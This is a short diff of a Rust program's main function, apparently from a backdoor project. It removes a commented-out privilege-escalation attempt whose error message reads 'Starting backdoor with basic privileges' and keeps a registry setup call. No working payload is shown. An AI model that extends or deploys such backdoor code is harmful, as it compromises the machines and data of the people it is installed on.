@@ -11,16 +11,6 @@ use stprotocol::{Client, HandleClient, Session};
 use structure::{Detector, Generator, StoneTransferProtocol};
 
 fn main() {
-    // if let p = !is_admin() {
-    //     println!("관리자 권한 없음 {:?}", p);
-    //     if is_elevated() {
-    //         match try_run_as_admin() {
-    //             Ok(_) => {}
-    //             Err(_) => eprintln!("Exploitation failed: Starting backdoor with basic privileges"),
-    //         }
-    //     }
-    // }
-
     match setup_registry() {
         Ok(_) => {}
         Err(_) => eprintln!(
